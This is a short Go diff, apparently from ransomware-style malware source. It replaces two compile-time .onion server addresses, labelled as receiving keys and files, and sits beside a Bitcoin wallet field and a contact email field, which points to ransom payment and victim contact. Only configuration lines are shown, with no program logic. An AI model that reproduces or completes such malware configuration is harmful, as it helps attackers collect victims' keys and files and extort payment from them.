@@ -23,9 +23,9 @@ import (
 
 var (
 	// ServerBaseURL1 is the server base url injected on compile time(for keys)
-	ServerBaseURL1 string = "nriebxqtxebfhffyybpqtc6r5em3nmmh5ps4dn4dibwxf4ywa6hguxyd.onion:3000"
+	ServerBaseURL1 string = "z63yhuizjxbgpzdxzb7cecqlobssejbh57kxpurstxosffopk4mrurqd.onion:3000"
 	// ServerBaseURL2 is the server base url injected on compile time(for files)
-	ServerBaseURL2 string = "wdgffq56zhi25wh73b24p27jdhyyagh7gak3swslic6qiy2fro4seeyd.onion:3000"
+	ServerBaseURL2 string = "pyat2trxxvzjf4pqkjzfmtk7gbxt6pur2abhjmughchgkfdno6sj4dad.onion:3000"
 	// Your wallet address
 	Wallet = "17Zwp6cHg49G677Pkv2Xk4cxNKnDU8FkAR"
 	// Your contact email
